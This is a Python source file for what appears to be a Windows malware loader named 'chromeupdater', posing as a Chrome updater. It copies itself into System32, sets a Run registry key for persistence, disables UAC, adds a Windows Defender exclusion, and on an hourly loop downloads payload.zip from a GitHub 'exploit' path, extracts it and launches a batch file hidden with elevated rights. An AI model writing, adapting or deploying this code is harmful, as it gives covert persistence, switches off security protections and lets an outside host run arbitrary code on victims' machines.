# Copyright (c) 2022 Phoenixthrush UwU

# This Source Code Form is subject to the terms of the Mozilla Public
# License, v. 2.0. If a copy of the MPL was not distributed with this
# file, You can obtain one at https://mozilla.org/MPL/2.0/.

import os
import requests
from time import sleep

def timeout():
    sleep(3600) #1h

def check_if_version_exists():
    if os.path.exists("C:\Windows\System32\\version"):
        return True
    else:
        return False

def check_if_installer_exists():
    if os.path.exists("C:\Windows\System32\\chromeupdater.exe"):
        return True
    else:
        return False

def check_version():
    if check_if_version_exists() is True:
        if os.path.exists("C:\Windows\System32\\version_new"):
            os.system("del C:\Windows\System32\\version_new")
        else:
            pass
        url_version_new = "https://raw.githubusercontent.com/Phoenixthrush/phoenixthrush.github.io/master/exploit/version"
        url_content_version_new = requests.get(url_version_new, allow_redirects=True)
        open("C:\Windows\System32\\version_new","wb").write(url_content_version_new.content)
        #os.system("bitsadmin /transfer version_new /download /priority HIGH \"https://raw.githubusercontent.com/Phoenixthrush/phoenixthrush.github.io/master/exploit/version\" \"C:\Windows\System32\\version_new\"")
        with open("C:\Windows\System32\\version", "r") as file:
            version = file.read()
            file.close()
        with open("C:\Windows\System32\\version_new", "r") as file:
            version_new = file.read()
            file.close()
        if version == version_new:
            timeout()
            check_version()
        else:
            update()
            check_version()
    else:
        #os.system("echo hentai > C:\Windows\System32\\version")
        open("C:\Windows\System32\\version", "x").write("hentai")
        check_version()

def first_setup():
    copy = "copy " + os.getcwd() + "\chromeupdater.exe C:\Windows\System32"
    os.system(copy)
    os.system("reg add \"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" /v \"update\" /t REG_SZ /f /d \"C:\Windows\System32\chromeupdater.exe\"")
    os.system("cmd.exe /c %windir%\System32\\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
    os.system("powershell -command \"Add-MpPreference -ExclusionPath \"C:\Windows\System32\"\"")
    os.system("taskkill /im chromeupdater.exe /f")
    #exits

def update():
    os.system("del C:\Windows\System32\\version_new")
    os.system("del C:\Windows\System32\\version")

    #os.system("bitsadmin /transfer version /download /priority HIGH \"https://raw.githubusercontent.com/Phoenixthrush/phoenixthrush.github.io/master/exploit/version\" \"C:\Windows\System32\\version\"")
    #os.system("bitsadmin /transfer payload.zip /download /priority HIGH \"https://raw.githubusercontent.com/Phoenixthrush/phoenixthrush.github.io/master/exploit/payload.zip\" \"C:\Windows\System32\payload.zip\"")

    url_version = "https://raw.githubusercontent.com/Phoenixthrush/phoenixthrush.github.io/master/exploit/version"
    url_content = requests.get(url_version, allow_redirects=True)
    open("C:\Windows\System32\\version", "wb").write(url_content.content)

    url_version_new = "https://raw.githubusercontent.com/Phoenixthrush/phoenixthrush.github.io/master/exploit/version"
    url_content_version_new = requests.get(url_version_new, allow_redirects=True)
    open("C:\Windows\System32\\version_new", "wb").write(url_content_version_new.content)

    url_payload = "https://raw.githubusercontent.com/Phoenixthrush/phoenixthrush.github.io/master/exploit/payload.zip"
    url_content_payload = requests.get(url_payload, allow_redirects=True)
    open("C:\Windows\System32\payload.zip", "wb").write(url_content_payload.content)

    os.system("taskkill /im chromebackground.exe /f")
    # chromebackground.exe = if kill chromebackground.exe chromebackgroundlist.exe kills current payload
    sleep(15)

    rm_dir = "rmdir C:\Windows\System32\chromeupdater /s /q"
    os.system(rm_dir)
    debug_tmp = "powershell -command \"Expand-Archive C:\Windows\System32\payload.zip C:\Windows\System32\chromeupdater\""
    os.system(debug_tmp)
    os.system("del C:\Windows\System32\payload.zip")
    os.system("powershell -c \"Start-Process -Verb RunAs -WindowStyle hidden C:\Windows\System32\chromeupdater\chromebackgroundlist.bat\"")

def main():
    if os.path.exists("C:\Windows\System32\chromeupdater"):
        pass
    else:
        os.system("mkdir C:\Windows\System32\chromeupdater")
    if check_if_installer_exists() is False:
        first_setup()
    else:
        check_version()

if __name__ == "__main__":
    main()
